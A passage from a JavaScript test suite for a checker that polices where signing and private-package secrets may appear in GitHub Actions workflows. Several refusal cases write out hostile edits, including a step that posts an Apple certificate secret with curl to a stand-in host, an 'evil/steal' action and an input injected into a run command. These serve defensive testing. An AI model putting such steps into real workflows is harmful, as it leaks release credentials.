  assert.equal(result.status, 0, result.stderr);
});

test("permits only declared Apple signing secrets in a legacy tag-only lane", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs:\n  macos-sign:\n    needs: [candidate]\n    if: ${{ startsWith(github.ref, 'refs/tags/v') }}\n    env:\n      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}\n      KEY: ${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: ${{ secrets.APPLE_API_KEY }}\n      ISSUER: ${{ secrets.APPLE_API_ISSUER }}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add tag-only mac candidate workflow");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("permits only declared Apple signing secrets in an admission-gated tag-last lane", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci", "release-candidate"], candidate: { signMacos: true } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs: {}\n");
  writeFileSync(path.join(workflowDir, "release-candidate.yml"), "# Managed by right-git\npermissions:\n  contents: read\njobs:\n  macos-sign:\n    needs: [admission, candidate]\n    if: ${{ needs.admission.outputs.signed_qualification == 'true' }}\n    env:\n      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}\n      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}\n      KEY: ${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: ${{ secrets.APPLE_API_KEY }}\n      ISSUER: ${{ secrets.APPLE_API_ISSUER }}\n");
  git(root, "add", ".");
  git(root, "commit", "-m", "add admission-gated tag-last mac candidate workflow");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

const DEV_MAC_SIGN_CI = [
  "# Managed by right-git",
  "permissions:",
  "  contents: read",
  "jobs:",
  "  ci:",
  "    runs-on: macos-15",
  "  dev-mac-sign:",
  "    # Push to the default branch only.",
  "    needs: [ci]",
  "    if: ${{ github.event_name == 'push' && github.ref_name == github.event.repository.default_branch }}",
  "    environment: release",
  "    permissions:",
  "      contents: read",
  "    env:",
  "      CERT: ${{ secrets.APPLE_CERTIFICATE_BASE64 }}",
  "      PASS: ${{ secrets.APPLE_CERTIFICATE_PASSWORD }}",
  "      KEYCHAIN: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}",
  "",
].join("\n");

test("accepts the right-git devArtifact dev-mac-sign job in ci.yml when the manifest declares mac signing", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"], devArtifact: { mac: "sign", macAppPath: "target/App.app" } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), DEV_MAC_SIGN_CI);
  git(root, "add", ".");
  git(root, "commit", "-m", "add dev-mac-sign ci workflow");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("accepts notary API key secrets in dev-mac-sign when the manifest declares devArtifact mac notarize", () => {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"], devArtifact: { mac: "notarize", macAppPath: "target/App.app" } }));
  writeFileSync(path.join(workflowDir, "ci.yml"), `${DEV_MAC_SIGN_CI}      KEY: \${{ secrets.APPLE_API_KEY_BASE64 }}\n      KEY_ID: \${{ secrets.APPLE_API_KEY }}\n      ISSUER: \${{ secrets.APPLE_API_ISSUER }}\n`);
  git(root, "add", ".");
  git(root, "commit", "-m", "add notarizing dev-mac-sign ci workflow");
  const result = run(config, "--tier=patch");
  assert.equal(result.status, 0, result.stderr);
});

test("rejects dev-mac-sign secrets in ci.yml without a devArtifact mac sign declaration, on a dispatchable job, or with notarization keys", () => {
  const cases = [
    { manifest: { devArtifact: { windows: "unsigned", windowsGlob: "dist/*.exe" } }, ci: DEV_MAC_SIGN_CI },
    { manifest: {}, ci: DEV_MAC_SIGN_CI },
    { manifest: { devArtifact: { mac: "sign", macAppPath: "target/App.app" } }, ci: DEV_MAC_SIGN_CI.replace("github.event_name == 'push' && github.ref_name == github.event.repository.default_branch", "github.event_name == 'workflow_dispatch'") },
    { manifest: { devArtifact: { mac: "sign", macAppPath: "target/App.app" } }, ci: `${DEV_MAC_SIGN_CI}      KEY: \${{ secrets.APPLE_API_KEY_BASE64 }}\n` },
  ];
  for (const { manifest, ci } of cases) {
    const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
    const root = path.dirname(config);
    const workflowDir = path.join(root, ".github", "workflows");
    mkdirSync(workflowDir, { recursive: true });
    writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"], ...manifest }));
    writeFileSync(path.join(workflowDir, "ci.yml"), ci);
    git(root, "add", ".");
    git(root, "commit", "-m", "add unsafe dev-mac-sign ci workflow");
    const result = run(config, "--tier=patch");
    assert.notEqual(result.status, 0, JSON.stringify(manifest));
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

const SWIFT_PRIVATE = [{ host: "github.com", secret: "SWIFT_PRIVATE_TOKEN" }];

// Mirrors the managed ci job around the real rendered private-package steps.
function swiftPrivateCi(manifest, { extraStepLines = [], dispatch = false } = {}) {
  return [
    "# Managed by right-git",
    "name: fixture-ci",
    "on:",
    "  pull_request:",
    "  push:",
    "    branches: [main]",
    ...(dispatch ? ["  workflow_dispatch:"] : []),
    "permissions:",
    "  contents: read",
    "jobs:",
    "  private-repo-guard:",
    "    runs-on: ubuntu-24.04",
    "    steps:",
    "      - run: exit 1",
    "  ci:",
    "    needs: [private-repo-guard]",
    "    runs-on: macos-15",
    "    steps:",
    "      - uses: actions/checkout@v7",
    swiftPrivatePackagesConfigureStep(manifest).replace(/^\n/, ""),
    "      - run: bash ./gate.sh",
    ...extraStepLines,
    swiftPrivatePackagesCleanupStep(manifest).replace(/^\n/, ""),
    "",
  ].join("\n");
}

function releaseWithSwiftPrivate({ manifest, ci }) {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify({ schemaVersion: 1, compile: "github-actions-only", lanes: ["ci"], ...manifest }));
  writeFileSync(path.join(workflowDir, "ci.yml"), ci);
  git(root, "add", ".");
  git(root, "commit", "-m", "add swift private ci workflow");
  return run(config, "--tier=patch");
}

test("accepts exactly the declared swift.privatePackages secret in the rendered configure and cleanup steps", () => {
  const manifest = { swift: { privatePackages: SWIFT_PRIVATE } };
  const result = releaseWithSwiftPrivate({ manifest, ci: swiftPrivateCi(manifest) });
  assert.equal(result.status, 0, result.stderr);

  const two = { swift: { privatePackages: [...SWIFT_PRIVATE, { host: "example.com", secret: "OTHER_TOKEN" }] } };
  const twoResult = releaseWithSwiftPrivate({ manifest: two, ci: swiftPrivateCi(two) });
  assert.equal(twoResult.status, 0, twoResult.stderr);
});

test("rejects a declared swift.privatePackages secret outside the rendered private-package steps", () => {
  const manifest = { swift: { privatePackages: SWIFT_PRIVATE } };
  const base = swiftPrivateCi(manifest);
  const elsewhere = [
    // Another step of the ci job.
    swiftPrivateCi(manifest, { extraStepLines: ["      - run: echo ${{ secrets.SWIFT_PRIVATE_TOKEN }}"] }),
    // Same env line shape under an unrelated step.
    swiftPrivateCi(manifest, { extraStepLines: ["      - name: Gate", "        env:", "          RIGHT_GIT_PRIVATE_TOKEN_0: ${{ secrets.SWIFT_PRIVATE_TOKEN }}", "        run: bash ./gate.sh"] }),
    // Another job.
    `${base}  other:\n    runs-on: ubuntu-24.04\n    env:\n      T: \${{ secrets.SWIFT_PRIVATE_TOKEN }}\n`,
    // Workflow-level env.
    base.replace("permissions:\n  contents: read\n", "permissions:\n  contents: read\nenv:\n  T: ${{ secrets.SWIFT_PRIVATE_TOKEN }}\n"),
  ];
  for (const ci of elsewhere) {
    const result = releaseWithSwiftPrivate({ manifest, ci });
    assert.notEqual(result.status, 0, ci);
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("rejects undeclared secrets and undeclared swift.privatePackages in ci.yml", () => {
  const declared = { swift: { privatePackages: SWIFT_PRIVATE } };
  const base = swiftPrivateCi(declared);
  const cases = [
    // A secret the manifest does not declare, in the rendered step position.
    { manifest: declared, ci: base.replace(/secrets\.SWIFT_PRIVATE_TOKEN/g, "secrets.UNDECLARED_TOKEN") },
    // Declared secret plus an extra undeclared secret in the configure step env.
    { manifest: declared, ci: base.replace("        run: |\n          set -euo pipefail", "          EXTRA: ${{ secrets.UNDECLARED_TOKEN }}\n        run: |\n          set -euo pipefail") },
    // Rendered steps with no swift declaration in the manifest.
    { manifest: {}, ci: base },
    // Env index naming a different secret than the declared entry at that index.
    { manifest: { swift: { privatePackages: [{ host: "github.com", secret: "OTHER_TOKEN" }] } }, ci: base },
  ];
  for (const { manifest, ci } of cases) {
    const result = releaseWithSwiftPrivate({ manifest, ci });
    assert.notEqual(result.status, 0, JSON.stringify(manifest));
    assert.match(result.stderr, /release-capable permissions or secrets/i);
  }
});

test("rejects swift.privatePackages secrets when ci.yml is dispatchable", () => {
  const manifest = { swift: { privatePackages: SWIFT_PRIVATE }, devArtifact: { mac: "unsigned", dispatch: true, macAppPath: "target/App.app" } };
  const dispatched = releaseWithSwiftPrivate({ manifest, ci: swiftPrivateCi(manifest) });
  assert.notEqual(dispatched.status, 0);
  assert.match(dispatched.stderr, /release-capable permissions or secrets/i);

  // A rendered workflow_dispatch trigger refuses even if the manifest omits the flag.
  const plain = { swift: { privatePackages: SWIFT_PRIVATE } };
  const triggered = releaseWithSwiftPrivate({ manifest: plain, ci: swiftPrivateCi(plain, { dispatch: true }) });
  assert.notEqual(triggered.status, 0);
  assert.match(triggered.stderr, /release-capable permissions or secrets/i);
});

// swift.privatePackages in every lane @rightkit/git 0.2.41 renders it into. These tests render real
// workflows with the sibling @rightkit/git renderer, so the policy is pinned to what right-git writes;
// each refusal starts from the same renders and changes one thing.
const SWIFT_LANE_CANDIDATE = { buildScript: "ci:candidate", checkScript: "ci:candidate-check", admissionScript: "release:admit", stageSummaryScript: "release:stage-summary", artifactRoot: "widgets-unsigned" };
const SWIFT_NODE_LANES = {
  schemaVersion: 1,
  compile: "github-actions-only",
  lanes: ["ci", "qualification", "package-smoke", "release-candidate", "regenerate"],
  matrix: { os: ["ubuntu-latest", "macos-latest"], node: ["24"] },
  packageManager: "pnpm@11.25.0",
  regenerate: { script: "regenerate" },
  templateVersion: "1.0.0",
  swift: { privatePackages: SWIFT_PRIVATE },
};
const SWIFT_PUBLISH_LANES = {
  ...SWIFT_NODE_LANES,
  lanes: ["ci", "publish-npm", "publish-package-managers"],
  regenerate: undefined,
  publish: { npm: { oidc: true, provenance: true }, homebrew: { tap: "acme/homebrew-tap", formulaName: "widgets" }, winget: { packageIdentifier: "Acme.Widgets" } },
};
const SWIFT_RUST_LANES = {
  schemaVersion: 1,
  compile: "github-actions-only",
  profile: "rust-hybrid",
  lanes: ["ci", "release-candidate", "regenerate"],
  gate: { path: "scripts/gate.sh" },
  matrix: { os: ["xcode-27", "windows-2025"], node: ["26.8.1"] },
  packageManager: "pnpm@11.25.0",
  regenerate: { script: "regenerate" },
  candidate: { ...SWIFT_LANE_CANDIDATE, os: ["xcode-27", "windows-2025"] },
  devArtifact: { mac: "unsigned", windows: "unsigned", parallel: true, buildScript: "build:dev", macAppPath: "target/release/bundle/macos/Widgets.app", windowsGlob: "target/release/*.exe" },
  templateVersion: "1.2.0",
  swift: { privatePackages: SWIFT_PRIVATE },
};
// Every signing, qualification and publish job the release chain can render, plus the in-gate dev-mac-sign job.
const SWIFT_RUST_CHAIN = {
  ...SWIFT_RUST_LANES,
  lanes: ["ci", "release-candidate"],
  regenerate: undefined,
  matrix: { os: ["ubuntu-24.04", "windows-2025", "macos-15"], node: ["22.23.2"] },
  // In-gate dev artifact: the parallel layout renders dev-mac-sign with `needs: [ci, dev-artifact-mac]`, which the
  // dev-mac-sign allowance does not match today (see the report), so this fixture keeps the `needs: [ci]` shape.
  devArtifact: { mac: "notarize", macAppPath: SWIFT_RUST_LANES.devArtifact.macAppPath },
  candidate: {
    ...SWIFT_LANE_CANDIDATE,
    admissionScript: "release:admission",
    os: ["windows-2025", "macos-15"],
    signWindows: true,
    signMacos: true,
    releaseChain: {
      evidenceVerificationScript: "release:verify:evidence",
      windowsFinalizeScript: "release:finalize:win",
      macosFinalizeScript: "release:finalize:mac",
      installedQualificationScript: "release:qualify:installed",
      publishScript: "release:publish:qualified",
      qualificationRunnerVariable: "QUALIFICATION_RUNNER_LABEL",
      publishSecrets: ["CLOUDFLARE_API_TOKEN"],
    },
  },
};

const renderedWorkflows = (manifest) => Object.fromEntries(renderLanes(manifest, "/repos/fixture").map(({ filename, content }) => [filename, content]));

function releaseWithManagedWorkflows(manifest, workflows) {
  const config = fixture({ hostedWorkflows: "right-git-ci-only", includeCargoSources: false });
  const root = path.dirname(config);
  const workflowDir = path.join(root, ".github", "workflows");
  mkdirSync(workflowDir, { recursive: true });
  writeFileSync(path.join(root, ".rightgit.json"), JSON.stringify(manifest));
  for (const [name, text] of Object.entries(workflows)) writeFileSync(path.join(workflowDir, name), text);
  git(root, "add", ".");
  git(root, "commit", "-m", "managed right-git workflows");
  return run(config, "--tier=patch");
}

// Ids of the jobs whose text names the declared secret.
function jobsNamingSwiftSecret(workflow, secret = "SWIFT_PRIVATE_TOKEN") {
  const body = workflow.slice(workflow.indexOf("\njobs:\n") + "\njobs:\n".length);
  const parts = body.split(/^  ([A-Za-z0-9_-]+):$/m);
  const ids = [];
  for (let i = 1; i < parts.length; i += 2) if (parts[i + 1].includes(`secrets.${secret}`)) ids.push(parts[i]);
  return ids;
}

// Applies `edit` to the text of one job (its header line through the line before the next job) and asserts it changed.
function editJob(workflow, job, edit) {
  const header = `\n  ${job}:\n`;
  const start = workflow.indexOf(header);
  assert.ok(start >= 0, `fixture renders job ${job}`);
  const next = /\n  [A-Za-z0-9_-]+:\n/.exec(workflow.slice(start + header.length));
  const end = next ? start + header.length + next.index : workflow.length;
  const edited = edit(workflow.slice(start, end));
  assert.notEqual(edited, workflow.slice(start, end), `edit changed job ${job}`);
  return workflow.slice(0, start) + edited + workflow.slice(end);
}

function editText(text, pattern, replacement) {
  const edited = text.replace(pattern, () => replacement);
  assert.notEqual(edited, text, `edit changed the workflow: ${String(pattern)}`);
  return edited;
}

// The real rendered configure and cleanup steps, as the first two steps of `job`.
function withSwiftSteps(workflow, job, manifest) {
  const steps = `${swiftPrivatePackagesConfigureStep(manifest).slice(1)}\n${swiftPrivatePackagesCleanupStep(manifest).slice(1)}\n`;
  return editJob(workflow, job, (text) => editText(text, "\n    steps:\n", `\n    steps:\n${steps}`));
}

const SWIFT_ON_BLOCK = /^on:\n(?:(?:[ \t#][^\n]*)?\n)*/m;
const SWIFT_ENV_STEPS = /not in the env of the "Configure private Swift package access" or "Remove private Swift package access" step/;
const SWIFT_ENV_LINE = /not a RIGHT_GIT_PRIVATE_TOKEN_<n> env line naming entry <n> of swift\.privatePackages/;

function assertRefused(manifest, workflows, detail, label) {
  const result = releaseWithManagedWorkflows(manifest, workflows);
  assert.notEqual(result.status, 0, label);
  assert.match(result.stderr, /release-capable permissions or secrets/i, label);
  assert.match(result.stderr, detail, label);
}

// @rightkit/ci 0.2.49 `sign-existing` lane (Orthic-Labs/rightkit#257): accepted only in its exact rendered shape.
const SIGN_EXISTING_MANIFEST = {
  schemaVersion: 1,
  compile: "github-actions-only",
  profile: "rust-hybrid",
  lanes: ["ci", "sign-existing"],
  gate: { path: "scripts/gate.sh" },
  matrix: { os: ["xcode-27", "windows-2025"], node: ["26.8.1"] },
  packageManager: "pnpm@11.25.0",
  templateVersion: "1.2.0",
  signExisting: { macSignManifest: "build/dev-sign.json", macPayloadMetadata: "Legion.app/Contents/Resources/payload.json" },
};

test("accepts the rendered sign-existing lane in its exact shape", () => {
  assert.deepEqual(validateManifest(SIGN_EXISTING_MANIFEST).errors, []);
  const workflows = renderedWorkflows(SIGN_EXISTING_MANIFEST);
  assert.match(workflows["sign-existing.yml"], /secrets\.APPLE_CERTIFICATE_BASE64/);
  const result = releaseWithManagedWorkflows(SIGN_EXISTING_MANIFEST, workflows);
  assert.equal(result.status, 0, result.stderr);
  const named = releaseWithManagedWorkflows({ ...SIGN_EXISTING_MANIFEST, signExisting: { ...SIGN_EXISTING_MANIFEST.signExisting, environment: "legion-sign" } }, renderedWorkflows({ ...SIGN_EXISTING_MANIFEST, signExisting: { ...SIGN_EXISTING_MANIFEST.signExisting, environment: "legion-sign" } }));
  assert.equal(named.status, 0, named.stderr);
});

test("refuses every deviation from the sign-existing shape", () => {
  const base = renderedWorkflows(SIGN_EXISTING_MANIFEST);
  const guardRun = "        run: exit 1\n";
  const cases = [
    ["extra trigger", (t) => editText(t, "  workflow_dispatch:\n    inputs:", "  pull_request:\n  workflow_dispatch:\n    inputs:"), /workflow_dispatch only/],
    ["push trigger", (t) => editText(t, "  workflow_dispatch:\n    inputs:", "  push:\n  workflow_dispatch:\n    inputs:"), /workflow_dispatch only/],
    ["extra needs", (t) => editText(t, "needs: [private-repo-guard]", "needs: [private-repo-guard, ci]"), /job must need only private-repo-guard/],
    ["no default-branch gate", (t) => editText(t, "github.ref_name == github.event.repository.default_branch", "true"), /job must need only private-repo-guard/],
    ["no environment", (t) => editText(t, "    environment: release\n", ""), /job must need only private-repo-guard/],
    ["job write permission", (t) => editText(t, "      actions: read\n    steps:", "      actions: read\n      contents: write\n    steps:"), /job must need only private-repo-guard/],
    ["extra job permission", (t) => editText(t, "      actions: read\n    steps:", "      actions: read\n      id-token: read\n    steps:"), /job must need only private-repo-guard/],
    ["extra workflow permission", (t) => editText(t, "  actions: read\nconcurrency:", "  actions: read\n  pull-requests: read\nconcurrency:"), /workflow permissions must be exactly/],
    ["fourth secret", (t) => editText(t, "APPLE_DEVELOPER_ID: ${{ vars.APPLE_DEVELOPER_ID }}", "APPLE_DEVELOPER_ID: ${{ vars.APPLE_DEVELOPER_ID }}\n          NOTARY: ${{ secrets.APPLE_API_KEY }}"), /exactly the three Apple/],
    ["missing secret", (t) => editText(t, "APPLE_KEYCHAIN_PASSWORD: ${{ secrets.APPLE_KEYCHAIN_PASSWORD }}", "APPLE_KEYCHAIN_PASSWORD: fixed"), /exactly the three Apple/],
    ["secret outside the sign job", (t) => editText(t, guardRun, `${guardRun}        env:\n          T: \${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n`), /private-repo-guard job is not the managed guard|exactly the three Apple/],
    ["cargo build step", (t) => editText(t, "      - name: Remove Apple signing material", "      - name: Build\n        run: cargo build\n      - name: Remove Apple signing material"), /must not build/],
    ["release flag", (t) => editText(t, "      - name: Remove Apple signing material", "      - name: Build\n        run: pnpm exec right-release sign-dev-artifact --release\n      - name: Remove Apple signing material"), /must not build/],
    ["right-release build", (t) => editText(t, "      - name: Remove Apple signing material", "      - name: Build\n        run: pnpm exec right-release build\n      - name: Remove Apple signing material"), /right-release build is not allowed/],
    ["notarization", (t) => editText(t, "      - name: Remove Apple signing material", "      - name: Notarize\n        run: xcrun notarytool submit x\n      - name: Remove Apple signing material"), /must not build, notarize or release/],
    ["unpinned action", (t) => editText(t, /actions\/download-artifact@[0-9a-f]{40}/, "actions/download-artifact@v4"), /not an allowed commit-pinned action/],
    ["unlisted action", (t) => editText(t, /actions\/download-artifact@[0-9a-f]{40}/, "evil/steal@0123456789012345678901234567890123456789"), /not an allowed commit-pinned action/],
    ["extra job", (t) => `${t}  extra:\n    runs-on: ubuntu-24.04\n    steps:\n      - run: echo hi\n`, /jobs must be exactly private-repo-guard and sign-existing/],
    ["pull_request_target", (t) => editText(t, "  workflow_dispatch:\n    inputs:", "  pull_request_target:\n  workflow_dispatch:\n    inputs:"), /workflow_dispatch only/],
  ];
  for (const [label, edit, detail] of cases) {
    const result = releaseWithManagedWorkflows(SIGN_EXISTING_MANIFEST, { ...base, "sign-existing.yml": edit(base["sign-existing.yml"]) });
    assert.notEqual(result.status, 0, label);
    assert.match(result.stderr, /sign-existing/, label);
    assert.match(result.stderr, detail, label);
  }
  // Passes every pattern above but is not the managed render: only byte equality with the @rightkit/ci render refuses these.
  const notTheRender = /not byte-for-byte the @rightkit\/ci render/;
  const beforeCleanup = "      - name: Remove Apple signing material";
  const render = [
    ["extra step copying a secret into env and posting it", (t) => editText(t, beforeCleanup, `      - name: Report\n        env:\n          S: \${{ secrets.APPLE_CERTIFICATE_BASE64 }}\n        run: curl -d "$S" https://example.invalid\n${beforeCleanup}`)],
    ["workflow input interpolated straight into run", (t) => editText(t, beforeCleanup, `      - name: Echo\n        run: echo \${{ inputs.artifact }}\n${beforeCleanup}`)],
    ["harmless-looking edit", (t) => editText(t, "name: fixture-sign-existing", "name: fixture-sign-existing-x")],
  ];
  for (const [label, edit] of render) {
    const result = releaseWithManagedWorkflows(SIGN_EXISTING_MANIFEST, { ...base, "sign-existing.yml": edit(base["sign-existing.yml"]) });
    assert.notEqual(result.status, 0, label);
    assert.match(result.stderr, notTheRender, label);
  }
  const undeclared = releaseWithManagedWorkflows({ ...SIGN_EXISTING_MANIFEST, signExisting: undefined }, base);
  assert.notEqual(undeclared.status, 0, "manifest must declare signExisting");
  assert.match(undeclared.stderr, /declares no signExisting/);
});

test("accepts the swift.privatePackages credential in every workflow and job @rightkit/git 0.2.41 renders it into", () => {
  const expected = [
    [SWIFT_NODE_LANES, { "ci.yml": ["test"], "qualification.yml": ["qualification"], "package-smoke.yml": [], "release-candidate.yml": ["candidate"], "regenerate.yml": ["regenerate"] }],
    [SWIFT_RUST_LANES, { "ci.yml": ["ci", "dev-artifact-mac"], "release-candidate.yml": ["candidate"], "regenerate.yml": ["regenerate"] }],
  ];
  for (const [manifest, jobsByWorkflow] of expected) {
    const profile = manifest.profile ?? "node";
    assert.deepEqual(validateManifest(manifest).errors, [], profile);
    const workflows = renderedWorkflows(manifest);
    // The renders really carry the credential where this policy must accept it, and nowhere else.
    assert.deepEqual(Object.fromEntries(Object.entries(workflows).map(([name, text]) => [name, jobsNamingSwiftSecret(text)])), jobsByWorkflow, profile);
    // Dispatch lanes by design versus lanes that must never be dispatchable.
    for (const name of ["release-candidate.yml", "regenerate.yml"]) assert.match(workflows[name], /^on:\n(?:.*\n)*?  workflow_dispatch:/m, `${profile}/${name} is a dispatch lane`);
    for (const name of ["ci.yml", "qualification.yml"]) assert.doesNotMatch(workflows[name] ?? "", /workflow_dispatch/, `${profile}/${name} is not dispatchable`);
    const result = releaseWithManagedWorkflows(manifest, workflows);
    assert.equal(result.status, 0, `${profile}: ${result.stderr}`);
  }
  // The node release candidate also runs on pushed v* tags.
  assert.match(renderedWorkflows(SWIFT_NODE_LANES)["release-candidate.yml"], /^  push:\n    tags: \['v\*'\]/m);
});

test("refuses the swift.privatePackages credential where a manual run of any ref would reach it (ci.yml and qualification.yml)", () => {
  const cases = [
    [SWIFT_NODE_LANES, "ci.yml"],
    [SWIFT_NODE_LANES, "qualification.yml"],
    [SWIFT_RUST_LANES, "ci.yml"],
  ];
  for (const [manifest, name] of cases) {
    const workflows = renderedWorkflows(manifest);
    workflows[name] = editText(workflows[name], /^on:\n/m, "on:\n  workflow_dispatch:\n");
    assertRefused(manifest, workflows, new RegExp(`secrets\\.SWIFT_PRIVATE_TOKEN: ${name.replace(".", "\\.")} has a workflow_dispatch trigger`), `${manifest.profile ?? "node"}/${name}`);
  }
  // devArtifact.dispatch in the manifest refuses the credential in every lane, not only ci.yml.
  const rust = { ...SWIFT_RUST_LANES, devArtifact: { ...SWIFT_RUST_LANES.devArtifact, dispatch: true } };
  assertRefused(rust, renderedWorkflows(SWIFT_RUST_LANES), /secrets\.SWIFT_PRIVATE_TOKEN: devArtifact\.dispatch is true/, "devArtifact.dispatch");
});

test("refuses the swift.privatePackages credential in a workflow triggered by pull_request_target or workflow_run, in any trigger form", () => {
  const forms = [
    ["pull_request_target block", "on:\n  pull_request_target:\n", /^on:\n/m, "pull_request_target"],
    ["workflow_run block", "on:\n  workflow_run:\n    workflows: [ci]\n    types: [completed]\n", /^on:\n/m, "workflow_run"],
    ["workflow_run flow list", "on: [push, workflow_run]\n", SWIFT_ON_BLOCK, "workflow_run"],
    ["pull_request_target scalar", "on: pull_request_target\n", SWIFT_ON_BLOCK, "pull_request_target"],
    ["workflow_run flow map", "on: { workflow_run: { workflows: [ci] } }\n", SWIFT_ON_BLOCK, "workflow_run"],
  ];
  const targets = [
    [SWIFT_NODE_LANES, "ci.yml"],
    [SWIFT_NODE_LANES, "qualification.yml"],
    [SWIFT_NODE_LANES, "release-candidate.yml"],
    [SWIFT_NODE_LANES, "regenerate.yml"],
    [SWIFT_RUST_LANES, "ci.yml"],
    [SWIFT_RUST_LANES, "release-candidate.yml"],
  ];
  for (const [manifest, name] of targets) {
    for (const [form, replacement, pattern, trigger] of forms) {
      const workflows = renderedWorkflows(manifest);
      // Block forms keep the original triggers beside the added one; flow and scalar forms replace the whole on: block.
      workflows[name] = editText(workflows[name], pattern, replacement);
      assertRefused(manifest, workflows, new RegExp(`secrets\\.SWIFT_PRIVATE_TOKEN: ${name.replace(".", "\\.")} is triggered by ${trigger}`), `${manifest.profile ?? "node"}/${name} ${form}`);
    }
  }
});

test("refuses the swift.privatePackages credential in signing, qualification and publishing jobs and in the lanes that never render it", () => {
  const jobs = [
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "private-repo-guard"],
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "admission"],
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "windows-sign"],
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "macos-sign"],
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "installed-qualification"],
    [SWIFT_RUST_CHAIN, "release-candidate.yml", "publish"],
    [SWIFT_RUST_CHAIN, "ci.yml", "private-repo-guard"],
    [SWIFT_RUST_CHAIN, "ci.yml", "dev-mac-sign"],
    [SWIFT_RUST_LANES, "ci.yml", "dev-artifact-windows"],
    [SWIFT_NODE_LANES, "ci.yml", "private-repo-guard"],
    [SWIFT_NODE_LANES, "qualification.yml", "private-repo-guard"],
    [SWIFT_NODE_LANES, "qualification.yml", "schema"],
    [SWIFT_NODE_LANES, "qualification.yml", "security"],
    [SWIFT_NODE_LANES, "qualification.yml", "hardening"],
    [SWIFT_NODE_LANES, "qualification.yml", "conformance"],
    [SWIFT_NODE_LANES, "release-candidate.yml", "private-repo-guard"],
    [SWIFT_NODE_LANES, "regenerate.yml", "private-repo-guard"],
  ];
  for (const [manifest, name, job] of jobs) {
    const workflows = renderedWorkflows(manifest);
    workflows[name] = withSwiftSteps(workflows[name], job, manifest);
    assertRefused(manifest, workflows, new RegExp(`secrets\\.SWIFT_PRIVATE_TOKEN: job '${job}' of ${name.replace(".", "\\.")} may not hold the swift\\.privatePackages credential`), `${name}/${job}`);
  }
  // One lane per repository, so the lanes that are refused for their own publishing credentials cannot hide each other.
  const lanes = [
    [{ ...SWIFT_NODE_LANES, lanes: ["ci", "package-smoke"] }, "package-smoke.yml", "clean-tarball"],
    [{ ...SWIFT_PUBLISH_LANES, lanes: ["ci", "publish-npm"] }, "publish-npm.yml", "publish-npm"],
    [{ ...SWIFT_PUBLISH_LANES, lanes: ["ci", "publish-package-managers"] }, "publish-package-managers.yml", "homebrew"],
    [{ ...SWIFT_PUBLISH_LANES, lanes: ["ci", "publish-package-managers"] }, "publish-package-managers.yml", "winget"],
  ];
  for (const [manifest, name, job] of lanes) {
    const workflows = renderedWorkflows(manifest);
    workflows[name] = withSwiftSteps(workflows[name], job, manifest);
    assertRefused(manifest, workflows, new RegExp(`secrets\\.SWIFT_PRIVATE_TOKEN: swift\\.privatePackages credentials are never rendered into ${name.replace(".", "\\.")}`), `${name}/${job}`);
  }
});

const SWIFT_ALLOWED_JOBS = [
  [SWIFT_NODE_LANES, "ci.yml", "test"],
  [SWIFT_NODE_LANES, "qualification.yml", "qualification"],
  [SWIFT_NODE_LANES, "release-candidate.yml", "candidate"],
  [SWIFT_NODE_LANES, "regenerate.yml", "regenerate"],
  [SWIFT_RUST_LANES, "ci.yml", "ci"],
